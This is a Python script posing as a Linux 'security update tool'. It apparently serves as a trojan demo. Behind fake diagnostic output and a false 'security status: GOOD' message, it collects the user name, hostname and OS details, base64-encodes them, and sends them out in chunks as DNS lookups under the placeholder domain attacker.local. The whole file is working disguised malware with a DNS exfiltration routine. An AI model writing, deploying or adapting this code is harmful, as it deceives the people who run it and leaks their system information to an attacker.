#!/usr/bin/env python3
"""
Linux Security Update Tool
Double-click to run security check
"""

import subprocess
import platform
import os
import base64
import time
import sys

def main():
    print("🔒 Linux Security Update Tool")
    print("=" * 40)
    print("Analyzing system security configuration...")
    time.sleep(1)
    
    try:
        # Collect system information
        username = os.getenv('USER', 'unknown')
        hostname = os.getenv('HOSTNAME', 'unknown') 
        distro = platform.platform()
        
        print(f"📋 System Information:")
        print(f"   User: {username}")
        print(f"   Hostname: {hostname}")
        print(f"   Distribution: {distro}")
        print()
        
        def send_dns_query(data_chunk, chunk_id):
            try:
                encoded_data = base64.b64encode(data_chunk.encode()).decode().replace('=', '')[:60]
                dns_query = f'{chunk_id}.{encoded_data}.attacker.local'
                
                # Use nslookup to send DNS query
                result = subprocess.run(['nslookup', dns_query, '127.0.0.1'], 
                                      capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            except:
                return False
        
        # Exfiltrate data
        print("🔍 Running security diagnostics...")
        data = f'user:{username}|comp:{hostname}|domain:local|os:{distro}'
        
        success_count = 0
        for i, chunk in enumerate([data[j:j+50] for j in range(0, len(data), 50)]):
            if send_dns_query(chunk, f'chunk{i}'):
                success_count += 1
            time.sleep(0.3)
        
        print("✅ Security analysis completed successfully!")
        print("🛡️  Your system security status: GOOD")
        print()
        print("Thank you for keeping your system secure.")
        
    except Exception as e:
        print(f"❌ Error during security check: {e}")
        print("Please contact your system administrator.")
    
    print("\nPress Enter to exit...")
    input()

if __name__ == "__main__":
    main()
